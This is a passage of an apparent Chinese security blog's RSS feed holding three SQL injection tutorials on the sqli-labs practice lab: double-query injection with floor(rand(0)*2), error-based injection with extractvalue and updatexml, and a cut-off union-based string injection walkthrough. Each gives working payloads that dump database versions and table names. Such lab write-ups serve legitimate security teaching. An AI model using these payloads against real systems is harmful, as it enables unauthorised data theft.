class=&#34;line&#34;&gt;select 1,count(1) from information_schema.tables group by floor(rand(0)*2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用group by floor(rand() *2)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930223216903.png&#34; alt=&#34;image-20220930223216903&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到，uname 和 password位都被select的内容（1和2）代替。&lt;/p&gt;
&lt;p&gt;下面探究group by、rand()、count()的组合使用的关系。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问一：rand-和rand-0-有什么区别&#34;&gt;&lt;a href=&#34;#灵魂拷问一：rand-和rand-0-有什么区别&#34; class=&#34;headerlink&#34; title=&#34;灵魂拷问一：rand()和rand(0)有什么区别?&#34;&gt;&lt;/a&gt;灵魂拷问一：rand()和rand(0)有什么区别?&lt;/h3&gt;&lt;p&gt;使用&lt;code&gt;rand() *2&lt;/code&gt;，&lt;code&gt;第一次&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225234750.png&#34; alt=&#34;image-20220930225234750&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;rand() *2&lt;/code&gt;，&lt;code&gt;第二次&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225215910.png&#34; alt=&#34;image-20220930225215910&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;rand() *2&lt;/code&gt;，&lt;code&gt;第三次&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225250214.png&#34; alt=&#34;image-20220930225250214&#34;&gt;&lt;/p&gt;
&lt;p&gt;综合以上三次使用rand()*2的情况，我们发现结果毫无规律，是真正的随机。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;rand(0) *2&lt;/code&gt;，&lt;code&gt;第一次&lt;/code&gt;、&lt;code&gt;第二次&lt;/code&gt;、&lt;code&gt;第三次&lt;/code&gt;都是下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225429894.png&#34; alt=&#34;image-20220930225429894&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果说明，使用rand(0)*2可以做到一种伪随机变化，会一直保持011 011 011这样的规律。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问二：为什么select-1-count-1-from-xxx-group-by-floor-rand-0-2-会报错？&#34;&gt;&lt;a href=&#34;#灵魂拷问二：为什么select-1-count-1-from-xxx-group-by-floor-rand-0-2-会报错？&#34; class=&#34;headerlink&#34; title=&#34;灵魂拷问二：为什么select 1, count(1) from xxx group by floor(rand(0) * 2) 会报错？&#34;&gt;&lt;/a&gt;灵魂拷问二：为什么select 1, count(1) from xxx group by floor(rand(0) * 2) 会报错？&lt;/h3&gt;&lt;p&gt;我们需要知道先创建虚拟表，以下图(其中key是group by后面跟随的内容【即主键】，不可重复)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930230206868.png&#34; alt=&#34;image-20220930230206868&#34;&gt;&lt;/p&gt;
&lt;p&gt;开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则count(1)字段直接加1，&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930230334615.png&#34; alt=&#34;image-20220930230334615&#34;&gt;&lt;/p&gt;
&lt;p&gt;由此看到 若是key存在的话就+1， 不存在的话就新建一个key。&lt;/p&gt;
&lt;p&gt;但是mysql官方有给提示，查询的时候若是使用了rand()的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用group by 的时候，floor(rand(0)*2)会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。&lt;/p&gt;
&lt;p&gt;由前文可知，floor(rand(0)*2) 的值是011011011…….的规律。&lt;/p&gt;
&lt;p&gt;取第一条记录，取到的值是0【&lt;code&gt;第一次计算&lt;/code&gt;】。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;判断&lt;/code&gt;：虚表中发现0这个键值并不存在，那么，floor(rand(0)*2)会被再次计算一次&lt;/p&gt;
&lt;p&gt;结果取到了1【&lt;code&gt;第二次计算&lt;/code&gt;】。将key=1插入虚表，这是第一条记录查询完毕。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930231052670.png&#34; alt=&#34;image-20220930231052670&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询第二次记录，再次计算floor(rand(0)*2)，发现结果为1【&lt;code&gt;第三次计算&lt;/code&gt;】。&lt;/p&gt;
&lt;p&gt;查询虚表，发现1这个键值已经存在，因此floor(rand(0)*2) 不会再次计算，直接count(1)加1，第二条记录查询完毕。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930231458853.png&#34; alt=&#34;image-20220930231458853&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询第三条记录，再次计算floor(rand(0)*2)，取值为0【&lt;code&gt;第四次计算&lt;/code&gt;】，查询虚表，发现键值没有0，则再次计算floor，取值为1【&lt;code&gt;第五次计算&lt;/code&gt;】&lt;/p&gt;
&lt;p&gt;而此时，1这个主键已经存在于虚表中，新计算的值也为1【&lt;code&gt;第五次计算&lt;/code&gt;】，&lt;strong&gt;由于插入的key主键值必须唯一&lt;/strong&gt;，新计算的1和主键1重复，因此插入的时候直接报错。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问三：选择rand-0-而非rand-的原因&#34;&gt;&lt;a href=&#34;#灵魂拷问三：选择rand-0-而非rand-的原因&#34; class=&#34;headerlink&#34; title=&#34;灵魂拷问三：选择rand(0)而非rand()的原因&#34;&gt;&lt;/a&gt;灵魂拷问三：选择rand(0)而非rand()的原因&lt;/h3&gt;&lt;p&gt;简而言之，group by插入进&lt;key，count(1)&gt;虚表的前提是——&lt;code&gt;当前的记录在虚表中不存在&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;白话文解释：当前的记录由于011011011这特殊规律导致0这个记录的在表中不存在，计算时总是被取值成1插入虚表，第一次还能插进来，但在第二次新插入进来的1又存在于虚表中，所以就报“重复条目“的错了。&lt;/p&gt;
&lt;p&gt;选择&lt;code&gt;rand(0)x2&lt;/code&gt;是&lt;strong&gt;必会报错&lt;/strong&gt;，而&lt;code&gt;rand()x2&lt;/code&gt;就不一定了【可能报错、可能不报错】。&lt;/p&gt;
&lt;p&gt;因为通过上文解释，如果不是011011这个特殊规律，0和1是都可以进到虚表中，如果都能进来，那就不会报错。&lt;/p&gt;
&lt;p&gt;因此，100%报错须要count()，rand(0)*2、group by，三者缺一不可。&lt;/p&gt;
&lt;h3 id=&#34;双注入走起&#34;&gt;&lt;a href=&#34;#双注入走起&#34; class=&#34;headerlink&#34; title=&#34;双注入走起&#34;&gt;&lt;/a&gt;双注入走起&lt;/h3&gt;&lt;p&gt;首先使用concat组合字符串&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001000024436.png&#34; alt=&#34;image-20221001000024436&#34;&gt;&lt;/p&gt;
&lt;p&gt;将version处替换成我们想要的select语句【注意，这里只能使用limit 0,1来进行输出爆破，group_concat会爆出数据库信息失败】&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001000515293.png&#34; alt=&#34;image-20221001000515293&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，双注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</guid>
            <title>报错注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 23:57:38 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之报错注入&#34;&gt;&lt;a href=&#34;#SQL-注入之报错注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之报错注入&#34;&gt;&lt;/a&gt;SQL 注入之报错注入&lt;/h1&gt;&lt;p&gt;本篇使用报错注入。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：报错函数的使用中，第二个参数如果来自于查询语句，都是&lt;strong&gt;需要用小括号包裹起来的&lt;/strong&gt;。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#使用 extractvalue(1, (select xxx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(&amp;#x27;%&amp;#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#使用 updatexml(1, (select xxx), 1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, updatexml(1, concat(&amp;#x27;%&amp;#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h2&gt;&lt;h3 id=&#34;设置代理&#34;&gt;&lt;a href=&#34;#设置代理&#34; class=&#34;headerlink&#34; title=&#34;设置代理&#34;&gt;&lt;/a&gt;设置代理&lt;/h3&gt;&lt;p&gt;还是Less-11，我们挂上&lt;strong&gt;BurpSuit&lt;/strong&gt;代理，然后&lt;strong&gt;Send To Reapeater&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929231322659.png&#34; alt=&#34;image-20220929231322659&#34;&gt;&lt;/p&gt;
&lt;p&gt;报错注入常使用的函数如下：&lt;/p&gt;
&lt;p&gt;①&lt;strong&gt;extractvalue&lt;/strong&gt;():从目标XML中返回包含所查询值的字符串。&lt;/p&gt;
&lt;p&gt;例子：extractvalue(XML_document, XPath_string);&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个参数&lt;/code&gt;：XML_documentshi String格式，为XML文档对象的名称。&lt;strong&gt;在报错注入中可以随意指定，比如1即可。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第二个参数&lt;/code&gt;：XPath_string (Xpath格式的字符串)。&lt;strong&gt;在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;concat()：返回结果为连接参数产生的字符串。&lt;/p&gt;
&lt;p&gt;②&lt;strong&gt;updatexml&lt;/strong&gt;(): 更新XML信息&lt;/p&gt;
&lt;p&gt;例子：updatexml(XML_document, XPath_string, new_value); &lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个参数&lt;/code&gt;：XML_document是String格式，为XML文档对象的名称。&lt;strong&gt;在报错注入中可以随意指定，比如1即可。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第二个参数&lt;/code&gt;：XPath_string (XPATH格式的字符串)。&lt;strong&gt;在报错注入中由于就是利用这个点来泄露信息，所以重点构造语句放在这个第二个参数里。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第三个参数&lt;/code&gt;：new_value, String格式， 替换查找到的符合条件的数据。&lt;strong&gt;在报错注入中可以随意指定，比如1即可。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型和列数&#34;&gt;&lt;a href=&#34;#确定注入类型和列数&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型和列数&#34;&gt;&lt;/a&gt;确定注入类型和列数&lt;/h3&gt;&lt;p&gt;通过单引号注入和order by n来&lt;strong&gt;确定注入类型&lt;/strong&gt;和&lt;strong&gt;查询列数&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929232026560.png&#34; alt=&#34;image-20220929232026560&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用指定报错函数&#34;&gt;&lt;a href=&#34;#使用指定报错函数&#34; class=&#34;headerlink&#34; title=&#34;使用指定报错函数&#34;&gt;&lt;/a&gt;使用指定报错函数&lt;/h3&gt;&lt;p&gt;那么我们就可构造：&lt;/p&gt;
&lt;p&gt;extractvalue(1, XPATH_string)，其中XPATH_string为(select version())&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, (select version())) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233031785.png&#34; alt=&#34;image-20220929233031785&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到版本号被截断，信息不全。我们尝试调concat()函数使用0x7e字符拼接：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(0x7e, (select version()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233343167.png&#34; alt=&#34;image-20220929233343167&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里分割字符串可以换成%，分割字符串的选择比较看运气，有时候后台会校验，所以多用ASCII来表示。&lt;strong&gt;比如波浪线的ASCII为0x7e&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233647634.png&#34; alt=&#34;image-20220929233647634&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;泄露数据库信息&#34;&gt;&lt;a href=&#34;#泄露数据库信息&#34; class=&#34;headerlink&#34; title=&#34;泄露数据库信息&#34;&gt;&lt;/a&gt;泄露数据库信息&lt;/h3&gt;&lt;p&gt;准备泄露数据库的表名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1, extractvalue(1, concat(&amp;#x27;%&amp;#x27;, (select table_name from information_schema.tables where table_schema=database()))) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是报了错，&lt;code&gt;Subquery returns more than 1 row&lt;/code&gt;，说明最后查询的select的列数超过了一列。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929233914430.png&#34; alt=&#34;image-20220929233914430&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们需要&lt;strong&gt;使用limit 0,1限制一列输出&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234118900.png&#34; alt=&#34;image-20220929234118900&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;strong&gt;使用group_concat拼接成一列&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234238245.png&#34; alt=&#34;image-20220929234238245&#34;&gt;&lt;/p&gt;
&lt;p&gt;同理，也使用updatexml进行报错注入&lt;/p&gt;
&lt;p&gt;构造时，因为我们关键是为了调用&lt;code&gt;updatexml&lt;/code&gt;函数和使用&lt;code&gt;第二个参数&lt;/code&gt;进行内容输出，因此&lt;strong&gt;第一个参数&lt;/strong&gt;和&lt;strong&gt;第三个参数&lt;/strong&gt;都是&lt;strong&gt;“无用”&lt;/strong&gt;的，设置成1即可。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; union select 1, updatexml(1, concat(&amp;#x27;&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929234443551.png&#34; alt=&#34;image-20220929234443551&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，报错注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
            <title>字符型注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 21:54:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之字符型注入&#34;&gt;&lt;a href=&#34;#SQL-注入之字符型注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之字符型注入&#34;&gt;&lt;/a&gt;SQL 注入之字符型注入&lt;/h1&gt;&lt;p&gt;本篇使用字符型注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤-单引号注入&#34;&gt;&lt;a href=&#34;#注入步骤-单引号注入&#34; class=&#34;headerlink&#34; title=&#34;注入步骤(单引号注入)&#34;&gt;&lt;/a&gt;注入步骤(单引号注入)&lt;/h2&gt;&lt;p&gt;由于Less-1从请求上看到是GET型，所以礼节性地输入个id=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215708949.png&#34; alt=&#34;image-20220929215708949&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试注入类型&#34;&gt;&lt;a href=&#34;#尝试注入类型&#34; class=&#34;headerlink&#34; title=&#34;尝试注入类型&#34;&gt;&lt;/a&gt;尝试注入类型&lt;/h3&gt;&lt;p&gt;输入1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215814839.png&#34; alt=&#34;image-20220929215814839&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入22’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929215843779.png&#34; alt=&#34;image-20220929215843779&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，&lt;code&gt;&amp;#39;22&amp;#39;&amp;#39; LIMIT 0,1&lt;/code&gt;中，’22’’  外面包裹的两个单引号是查询时带上的，需要我们去闭合。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型&#34;&gt;&lt;a href=&#34;#确定注入类型&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型&#34;&gt;&lt;/a&gt;确定注入类型&lt;/h3&gt;&lt;p&gt;闭合单引号，需要在输入中添加一个单引号之后，使用行注释符注释后面的代码，常用的有: #、%23、—+&lt;/p&gt;
&lt;p&gt;那么，我们尝试一下#号&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不行，会报错，可能后台过滤了#号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220358319.png&#34; alt=&#34;image-20220929220358319&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试%23也一样，就不再贴图了。&lt;/p&gt;
&lt;p&gt;我们最后尝试—+，成功。&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220326957.png&#34; alt=&#34;image-20220929220326957&#34;&gt;&lt;/p&gt;
&lt;p&gt;由此，可以确定此题注入类型为字符型注入的&lt;strong&gt;单引号注入&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;确定列数&#34;&gt;&lt;a href=&#34;#确定列数&#34; class=&#34;headerlink&#34; title=&#34;确定列数&#34;&gt;&lt;/a&gt;确定列数&lt;/h3&gt;&lt;p&gt;使用order by n 来确定有多少列。&lt;strong&gt;order by n&lt;/strong&gt;会以当前表中的“&lt;strong&gt;第n列&lt;/strong&gt;”进行排序，如果&lt;strong&gt;第n列不存在&lt;/strong&gt;，则会抛出&lt;code&gt;Unknown column &amp;#39;n&amp;#39;&lt;/code&gt;的异常。&lt;/p&gt;
&lt;p&gt;4列？&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 4--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220842238.png&#34; alt=&#34;image-20220929220842238&#34;&gt;&lt;/p&gt;
&lt;p&gt;3列？&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 3--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929220533059.png&#34; alt=&#34;image-20220929220533059&#34;&gt;&lt;/p&gt;
&lt;p&gt;不报错，则说明&lt;code&gt;有3列&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;构造联合查询泄露数据库信息&#34;&gt;&lt;a href=&#34;#构造联合查询泄露数据库信息&#34; class=&#34;headerlink&#34; title=&#34;构造联合查询泄露数据库信息&#34;&gt;&lt;/a&gt;构造联合查询泄露数据库信息&lt;/h3&gt;&lt;p&gt;这回我们使用&lt;code&gt;and 0&lt;/code&gt;来构造对于id的查询为假的条件&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;sqli&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;Less&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 0 union select 1, group_concat(table_name), database() from 